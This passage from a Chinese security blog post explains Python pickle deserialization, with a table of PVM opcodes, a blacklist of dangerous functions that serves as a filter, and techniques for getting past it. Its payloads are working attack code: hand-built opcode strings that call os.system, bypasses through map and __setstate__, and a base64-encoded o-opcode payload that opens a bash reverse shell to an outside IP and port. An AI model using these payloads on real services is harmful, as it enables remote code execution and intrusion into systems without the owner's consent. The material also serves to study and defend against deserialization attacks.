+</div><p><img src="/p/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250703100240758.png"
+	width="1259"
+	height="749"
+	srcset="/p/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250703100240758_hu5454599918136244220.png 480w, /p/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250703100240758_hu6593526881276025167.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250703100240758"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="168"
+		data-flex-basis="403px"
+	
+></p>
+<p>也算是成功运行。</p>
+<h4 id="深层pickle解析">深层pickle解析
+</h4><p>从这里开始，我们并不需要像php那样自己定义类然后去序列化得到payload，<code>通过opcode指令集，我们可以自己去构建序列化的内容</code>。这意味着我们不需要依赖reduce等魔术方法了。</p>
+<p>初步了解了一下pickle的漏洞与利用，接下来的绕过需要更深层次的去了解一下pickle</p>
+<p>首先pickle是一种栈语言它由一串串opcode（指令集）组成。该语言的解析是依靠PVM进行的</p>
+<p>我们来看看PVM解析str的过程图</p>
+<p>参考链接：<a class="link" href="https://xz.aliyun.com/news/7032"  target="_blank" rel="noopener"
+    >pickle反序列化初探-先知社区</a></p>
+<p><img src="/p/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1.gif"
+	width="811"
+	height="606"
+	srcset="/p/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1_hu18217602513563829937.gif 480w, /p/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1_hu4889781175559035704.gif 1024w"
+	loading="lazy"
+	
+		alt="图片预览"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="133"
+		data-flex-basis="321px"
+	
+></p>
+<p><img src="/p/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/20200320230711-7972c0ea-6abc-1.gif"
+	width="811"
+	height="606"
+	srcset="/p/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/20200320230711-7972c0ea-6abc-1_hu6232806871853096559.gif 480w, /p/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/20200320230711-7972c0ea-6abc-1_hu8322395703636580542.gif 1024w"
+	loading="lazy"
+	
+		alt="图片预览"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="133"
+		data-flex-basis="321px"
+	
+></p>
+<p>这两张图看得懂了 ，我们再来看看opcode（指令集）</p>
+<p>在Python的pickle.py中，我们能够找到所有的opcode及其解释，常用的opcode如下，这里我们以V0版本为例</p>
+<p>我们用opcode手搓的代码其实就是pickle反序列化之后的内容，不过一个是字节码，一个是代码而已</p>
+<div class="table-wrapper"><table>
+<thead>
+<tr>
+<th>指令</th>
+<th>描述</th>
+<th>具体写法</th>
+<th>栈上的变化</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>c</td>
+<td>获取一个全局对象或import一个模块</td>
+<td>c[module]\n[instance]\n</td>
+<td>获得的对象入栈</td>
+</tr>
+<tr>
+<td>o</td>
+<td>寻找栈中的上一个MARK，以之间的第一个数据（必须为函数）为callable，第二个到第n个数据为参数，执行该函数（或实例化一个对象）</td>
+<td>o</td>
+<td>这个过程中涉及到的数据都出栈，函数的返回值（或生成的对象）入栈</td>
+</tr>
+<tr>
+<td>i</td>
+<td>相当于c和o的组合，先获取一个全局函数，然后寻找栈中的上一个MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）</td>
+<td>i[module]\n[callable]\n</td>
+<td>这个过程中涉及到的数据都出栈，函数返回值（或生成的对象）入栈</td>
+</tr>
+<tr>
+<td>N</td>
+<td>实例化一个None</td>
+<td>N</td>
+<td>获得的对象入栈</td>
+</tr>
+<tr>
+<td>S</td>
+<td>实例化一个字符串对象</td>
+<td>S&rsquo;xxx&rsquo;\n（也可以使用双引号、'等python字符串形式）</td>
+<td>获得的对象入栈</td>
+</tr>
+<tr>
+<td>V</td>
+<td>实例化一个UNICODE字符串对象</td>
+<td>Vxxx\n</td>
+<td>获得的对象入栈</td>
+</tr>
+<tr>
+<td>I</td>
+<td>实例化一个int对象</td>
+<td>Ixxx\n</td>
+<td>获得的对象入栈</td>
+</tr>
+<tr>
+<td>F</td>
+<td>实例化一个float对象</td>
+<td>Fx.x\n</td>
+<td>获得的对象入栈</td>
+</tr>
+<tr>
+<td>R</td>
+<td>选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数</td>
+<td>R</td>
+<td>函数和参数出栈，函数的返回值入栈</td>
+</tr>
+<tr>
+<td>.</td>
+<td>程序结束，栈顶的一个元素作为pickle.loads()的返回值</td>
+<td>.</td>
+<td>无</td>
+</tr>
+<tr>
+<td>(</td>
+<td>向栈中压入一个MARK标记</td>
+<td>(</td>
+<td>MARK标记入栈</td>
+</tr>
+<tr>
+<td>t</td>
+<td>寻找栈中的上一个MARK，并组合之间的数据为元组</td>
+<td>t</td>
+<td>MARK标记以及被组合的数据出栈，获得的对象入栈</td>
+</tr>
+<tr>
+<td>)</td>
+<td>向栈中直接压入一个空元组</td>
+<td>)</td>
+<td>空元组入栈</td>
+</tr>
+<tr>
+<td>l</td>
+<td>寻找栈中的上一个MARK，并组合之间的数据为列表</td>
+<td>l</td>
+<td>MARK标记以及被组合的数据出栈，获得的对象入栈</td>
+</tr>
+<tr>
+<td>]</td>
+<td>向栈中直接压入一个空列表</td>
+<td>]</td>
+<td>空列表入栈</td>
+</tr>
+<tr>
+<td>d</td>
+<td>寻找栈中的上一个MARK，并组合之间的数据为字典（数据必须有偶数个，即呈key-value对）</td>
+<td>d</td>
+<td>MARK标记以及被组合的数据出栈，获得的对象入栈</td>
+</tr>
+<tr>
+<td>}</td>
+<td>向栈中直接压入一个空字典</td>
+<td>}</td>
+<td>空字典入栈</td>
+</tr>
+<tr>
+<td>p</td>
+<td>将栈顶对象储存至memo_n</td>
+<td>pn\n</td>
+<td>无</td>
+</tr>
+<tr>
+<td>g</td>
+<td>将memo_n的对象压栈</td>
+<td>gn\n</td>
+<td>对象被压栈</td>
+</tr>
+<tr>
+<td>0</td>
+<td>丢弃栈顶对象</td>
+<td>0</td>
+<td>栈顶对象被丢弃</td>
+</tr>
+<tr>
+<td>b</td>
+<td>使用栈中的第一个元素（储存多个属性名: 属性值的字典）对第二个元素（对象实例）进行属性设置</td>
+<td>b</td>
+<td>栈上第一个元素出栈</td>
+</tr>
+<tr>
+<td>s</td>
+<td>将栈的第一个和第二个对象作为key-value对，添加或更新到栈的第三个对象（必须为列表或字典，列表以数字作为key）中</td>
+<td>s</td>
+<td>第一、二个元素出栈，第三个元素（列表或字典）添加新值或被更新</td>
+</tr>
+<tr>
+<td>u</td>
+<td>寻找栈中的上一个MARK，组合之间的数据（数据必须有偶数个，即呈key-value对）并全部添加或更新到该MARK之前的一个元素（必须为字典）中</td>
+<td>u</td>
+<td>MARK标记以及被组合的数据出栈，字典被更新</td>
+</tr>
+<tr>
+<td>a</td>
+<td>将栈的第一个元素append到第二个元素(列表)中</td>
+<td>a</td>
+<td>栈顶元素出栈，第二个元素（列表）被更新</td>
+</tr>
+<tr>
+<td>e</td>
+<td>寻找栈中的上一个MARK，组合之间的数据并extends到该MARK之前的一个元素（必须为列表）中</td>
+<td>e</td>
+<td>MARK标记以及被组合的数据出栈，列表被更新</td>
+</tr>
+</tbody>
+</table></div>
+<p>我们可以使用pickletools将opcode转化为易读的形式。仅作了解</p>
+<p><img src="/p/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250907144528216.png"
+	width="1064"
+	height="728"
+	srcset="/p/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250907144528216_hu5010039574025513979.png 480w, /p/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250907144528216_hu9193103198962182931.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250907144528216"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="146"
+		data-flex-basis="350px"
+	
+></p>
+<p>接下来，我们来看看如何自己手挫一个opcode</p>
+<p>首先，如果我们需要rce，那么就需要能够做到函数执行</p>
+<p>与函数执行相关的opcode有三个：<code>R</code>，<code>i</code>，<code>o</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1">#R</span>
+</span></span><span class="line"><span class="cl"><span class="sa">b</span><span class="s1">&#39;&#39;&#39;cos
+</span></span></span><span class="line"><span class="cl"><span class="s1">system
+</span></span></span><span class="line"><span class="cl"><span class="s1">(S&#39;whoami&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">tR.&#39;&#39;&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#i</span>
+</span></span><span class="line"><span class="cl"><span class="sa">b</span><span class="s1">&#39;&#39;&#39;(S&#39;whoami&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">ios
+</span></span></span><span class="line"><span class="cl"><span class="s1">system
+</span></span></span><span class="line"><span class="cl"><span class="s1">.&#39;&#39;&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#o</span>
+</span></span><span class="line"><span class="cl"><span class="sa">b</span><span class="s1">&#39;&#39;&#39;(cos
+</span></span></span><span class="line"><span class="cl"><span class="s1">system
+</span></span></span><span class="line"><span class="cl"><span class="s1">S&#39;whoami&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">o.&#39;&#39;&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">前面也看过PVM如何解析pickle的了</span><span class="err">，</span><span class="n">这里</span><span class="err">；</span><span class="n">就不多说</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>当然，手搓肯定是很困难的，这里可以用pker，可以将python源代码转化成pickle码的工具<a class="link" href="https://github.com/EddieIvan01/pker"  target="_blank" rel="noopener"
+    >GitHub - EddieIvan01/pker：自动将 Python 源代码转换为 Pickle作码</a></p>
+<h4 id="绕过">绕过
+</h4><p>​	reduce的底层编码方法就是利用了R指令码，那么就有两种过滤方式</p>
+<p>​	<code>禁止R指令码，但是对R执行的函数有黑名单限制。</code></p>
+<p>例如：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">black_type_list</span> <span class="o">=</span> <span class="p">[</span><span class="n">eval</span><span class="p">,</span> <span class="n">execfile</span><span class="p">,</span> <span class="n">compile</span><span class="p">,</span> <span class="n">open</span><span class="p">,</span> <span class="n">file</span><span class="p">,</span> <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">,</span> <span class="n">os</span><span class="o">.</span><span class="n">popen</span><span class="p">,</span> <span class="n">os</span><span class="o">.</span><span class="n">popen2</span><span class="p">,</span> <span class="n">os</span><span class="o">.</span><span class="n">popen3</span><span class="p">,</span> <span class="n">os</span><span class="o">.</span><span class="n">popen4</span><span class="p">,</span> <span class="n">os</span><span class="o">.</span><span class="n">fdopen</span><span class="p">,</span> <span class="n">os</span><span class="o">.</span><span class="n">tmpfile</span><span class="p">,</span> <span class="n">os</span><span class="o">.</span><span class="n">fchmod</span><span class="p">,</span> <span class="n">os</span><span class="o">.</span><span class="n">fchown</span><span class="p">,</span> <span class="n">os</span><span class="o">.</span><span class="n">open</span><span class="p">,</span> <span class="n">os</span><span class="o">.</span><span class="n">openpty</span><span class="p">,</span> <span class="n">os</span><span class="o">.</span><span class="n">read</span><span class="p">,</span> <span class="n">os</span><span class="o">.</span><span class="n">pipe</span><span class="p">,</span> <span class="n">os</span><span class="o">.</span><span class="n">chdir</span><span class="p">,</span> <span class="n">os</span><span class="o">.</span><span class="n">fchdir</span><span class="p">,</span> <span class="n">os</span><span class="o">.</span><span class="n">chroot</span><span class="p">,</span> <span class="n">os</span><span class="o">.</span><span class="n">chmod</span><span class="p">,</span> <span class="n">os</span><span class="o">.</span><span class="n">chown</span><span class="p">,</span> <span class="n">os</span><span class="o">.</span><span class="n">link</span><span class="p">,</span> <span class="n">os</span><span class="o">.</span><span class="n">lchown</span><span class="p">,</span> <span class="n">os</span><span class="o">.</span><span class="n">listdir</span><span class="p">,</span> <span class="n">os</span><span class="o">.</span><span class="n">lstat</span><span class="p">,</span> <span class="n">os</span><span class="o">.</span><span class="n">mkfifo</span><span class="p">,</span> <span class="n">os</span><span class="o">.</span><span class="n">mknod</span><span class="p">,</span> <span class="n">os</span><span class="o">.</span><span class="n">access</span><span class="p">,</span> <span class="n">os</span><span class="o">.</span><span class="n">mkdir</span><span class="p">,</span> <span class="n">os</span><span class="o">.</span><span class="n">makedirs</span><span class="p">,</span> <span class="n">os</span><span class="o">.</span><span class="n">readlink</span><span class="p">,</span> <span class="n">os</span><span class="o">.</span><span class="n">remove</span><span class="p">,</span> <span class="n">os</span><span class="o">.</span><span class="n">removedirs</span><span class="p">,</span> <span class="n">os</span><span class="o">.</span><span class="n">rename</span><span class="p">,</span> <span class="n">os</span><span class="o">.</span><span class="n">renames</span><span class="p">,</span> <span class="n">os</span><span class="o">.</span><span class="n">rmdir</span><span class="p">,</span> <span class="n">os</span><span class="o">.</span><span class="n">tempnam</span><span class="p">,</span> <span class="n">os</span><span class="o">.</span><span class="n">tmpnam</span><span class="p">,</span> <span class="n">os</span><span class="o">.</span><span class="n">unlink</span><span class="p">,</span> <span class="n">os</span><span class="o">.</span><span class="n">walk</span><span class="p">,</span> <span class="n">os</span><span class="o">.</span><span class="n">execl</span><span class="p">,</span> <span class="n">os</span><span class="o">.</span><span class="n">execle</span><span class="p">,</span> <span class="n">os</span><span class="o">.</span><span class="n">execlp</span><span class="p">,</span> <span class="n">os</span><span class="o">.</span><span class="n">execv</span><span class="p">,</span> <span class="n">os</span><span class="o">.</span><span class="n">execve</span><span class="p">,</span> <span class="n">os</span><span class="o">.</span><span class="n">dup</span><span class="p">,</span> <span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">,</span> <span class="n">os</span><span class="o">.</span><span class="n">execvp</span><span class="p">,</span> <span class="n">os</span><span class="o">.</span><span class="n">execvpe</span><span class="p">,</span> <span class="n">os</span><span class="o">.</span><span class="n">fork</span><span class="p">,</span> <span class="n">os</span><span class="o">.</span><span class="n">forkpty</span><span class="p">,</span> <span class="n">os</span><span class="o">.</span><span class="n">kill</span><span class="p">,</span> <span class="n">os</span><span class="o">.</span><span class="n">spawnl</span><span class="p">,</span> <span class="n">os</span><span class="o">.</span><span class="n">spawnle</span><span class="p">,</span> <span class="n">os</span><span class="o">.</span><span class="n">spawnlp</span><span class="p">,</span> <span class="n">os</span><span class="o">.</span><span class="n">spawnlpe</span><span class="p">,</span> <span class="n">os</span><span class="o">.</span><span class="n">spawnv</span><span class="p">,</span> <span class="n">os</span><span class="o">.</span><span class="n">spawnve</span><span class="p">,</span> <span class="n">os</span><span class="o">.</span><span class="n">spawnvp</span><span class="p">,</span> <span class="n">os</span><span class="o">.</span><span class="n">spawnvpe</span><span class="p">,</span> <span class="n">pickle</span><span class="o">.</span><span class="n">load</span><span class="p">,</span> <span class="n">pickle</span><span class="o">.</span><span class="n">loads</span><span class="p">,</span> <span class="n">cPickle</span><span class="o">.</span><span class="n">load</span><span class="p">,</span> <span class="n">cPickle</span><span class="o">.</span><span class="n">loads</span><span class="p">,</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">call</span><span class="p">,</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">check_call</span><span class="p">,</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">check_output</span><span class="p">,</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">Popen</span><span class="p">,</span> <span class="n">commands</span><span class="o">.</span><span class="n">getstatusoutput</span><span class="p">,</span> <span class="n">commands</span><span class="o">.</span><span class="n">getoutput</span><span class="p">,</span> <span class="n">commands</span><span class="o">.</span><span class="n">getstatus</span><span class="p">,</span> <span class="n">glob</span><span class="o">.</span><span class="n">glob</span><span class="p">,</span> <span class="n">linecache</span><span class="o">.</span><span class="n">getline</span><span class="p">,</span> <span class="n">shutil</span><span class="o">.</span><span class="n">copyfileobj</span><span class="p">,</span> <span class="n">shutil</span><span class="o">.</span><span class="n">copyfile</span><span class="p">,</span> <span class="n">shutil</span><span class="o">.</span><span class="n">copy</span><span class="p">,</span> <span class="n">shutil</span><span class="o">.</span><span class="n">copy2</span><span class="p">,</span> <span class="n">shutil</span><span class="o">.</span><span class="n">move</span><span class="p">,</span> <span class="n">shutil</span><span class="o">.</span><span class="n">make_archive</span><span class="p">,</span> <span class="n">dircache</span><span class="o">.</span><span class="n">listdir</span><span class="p">,</span> <span class="n">dircache</span><span class="o">.</span><span class="n">opendir</span><span class="p">,</span> <span class="n">io</span><span class="o">.</span><span class="n">open</span><span class="p">,</span> <span class="n">popen2</span><span class="o">.</span><span class="n">popen2</span><span class="p">,</span> <span class="n">popen2</span><span class="o">.</span><span class="n">popen3</span><span class="p">,</span> <span class="n">popen2</span><span class="o">.</span><span class="n">popen4</span><span class="p">,</span> <span class="n">timeit</span><span class="o">.</span><span class="n">timeit</span><span class="p">,</span> <span class="n">timeit</span><span class="o">.</span><span class="n">repeat</span><span class="p">,</span> <span class="n">sys</span><span class="o">.</span><span class="n">call_tracing</span><span class="p">,</span> <span class="n">code</span><span class="o">.</span><span class="n">interact</span><span class="p">,</span> <span class="n">code</span><span class="o">.</span><span class="n">compile_command</span><span class="p">,</span> <span class="n">codeop</span><span class="o">.</span><span class="n">compile_command</span><span class="p">,</span> <span class="n">pty</span><span class="o">.</span><span class="n">spawn</span><span class="p">,</span> <span class="n">posixfile</span><span class="o">.</span><span class="n">open</span><span class="p">,</span> <span class="n">posixfile</span><span class="o">.</span><span class="n">fileopen</span><span class="p">]</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>但是这样也会有漏网之鱼</p>
+<p><code>platform.popen()</code>、也可以用map：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">class Exploit(object):
+</span></span><span class="line"><span class="cl">    def __reduce__(self):
+</span></span><span class="line"><span class="cl"> 	return map,(os.system,[&#34;ls&#34;])
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>另外的<code>__setstate__</code>、<code>__getstate__</code>也可以替代<code>__reduce__</code></p>
+<p>使用方法如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="k">class</span> <span class="n">a</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">	<span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span><span class="n">name</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">		<span class="bp">self</span><span class="o">.</span><span class="n">name</span> <span class="o">=</span> <span class="n">name</span>
+</span></span><span class="line"><span class="cl">	<span class="k">def</span> <span class="nf">__setstate__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span><span class="n">name</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">		<span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s1">&#39;calc&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">tmp</span> <span class="o">=</span> <span class="n">pickle</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">a</span><span class="p">(</span><span class="s1">&#39;aa&#39;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">pickle</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">tmp</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="err">需要反序列化</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250703105345340.png"
+	width="1272"
+	height="799"
+	srcset="/p/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250703105345340_hu5005970670941222982.png 480w, /p/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250703105345340_hu18032858637568494387.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250703105345340"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="159"
+		data-flex-basis="382px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">class a():
+</span></span><span class="line"><span class="cl">	def __getstate__(self):
+</span></span><span class="line"><span class="cl">	os.system(calc)
+</span></span><span class="line"><span class="cl">b=a()
+</span></span><span class="line"><span class="cl">p_a=pickle.dumps(b)
+</span></span><span class="line"><span class="cl">直接序列化
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250703105757474.png"
+	width="1286"
+	height="539"
+	srcset="/p/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250703105757474_hu18381303837675231858.png 480w, /p/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250703105757474_hu10344371760465511506.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250703105757474"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="238"
+		data-flex-basis="572px"
+	
+></p>
+<p><code>还有一种过滤方式是把R指令过滤</code></p>
+<p>R指令过滤之后，我们可以用o指令绕过，下面是o指令反弹shell的脚本</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"><span class="n">shell</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;&#39;&#39;bash -c &#34;bash -i &gt;&amp; /dev/tcp/124.222.136.33/1337 0&lt;&amp;1&#34;&#39;&#39;&#39;</span>  <span class="c1"># 反弹shell语句</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;&#39;&#39;(ctimeit
+</span></span></span><span class="line"><span class="cl"><span class="s1">timeit
+</span></span></span><span class="line"><span class="cl"><span class="s1">(cos
+</span></span></span><span class="line"><span class="cl"><span class="s1">system
+</span></span></span><span class="line"><span class="cl"><span class="s1">V&#39;&#39;&#39;</span> <span class="o">+</span> <span class="n">shell</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;&#39;&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">oo.&#39;&#39;&#39;</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="java反序列化">java反序列化
+</h3><p>留到以后填坑，嘻嘻</p>
+<h2 id="小结">小结
+</h2><p>​	简单记录一下。</p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="">
+    <a href="/p/%E6%B8%97%E9%80%8F%E7%9F%A5%E8%AF%86%E7%82%B9%E6%B1%87%E6%80%BB/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">渗透知识点汇总</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/awdawdp%E4%BB%8E%E9%9B%B6%E5%88%B0%E4%B8%80/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">AWD|AWDP从零到一</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/%E8%87%AA%E4%B8%BB%E7%A0%94%E7%A9%B6%E6%96%B0%E5%8F%91%E7%8E%B0/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">自主研究新发现</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/nodejs/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">NodeJS</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/sql%E6%B3%A8%E5%85%A5/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">SQL注入</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <div class="disqus-container">
+    <div id="disqus_thread"></div>
+<script>
+    window.disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "hugo-theme-stack" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+
+<style>
+    .disqus-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+    }
+</style>
+
+<script>
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (typeof DISQUS == 'object') {
+            DISQUS.reset({
+                reload: true
+            });
+        }
+    })
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2025 - 
+        
+        2026 liernian
+    </section>
+    
+    <section class="powerby">
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
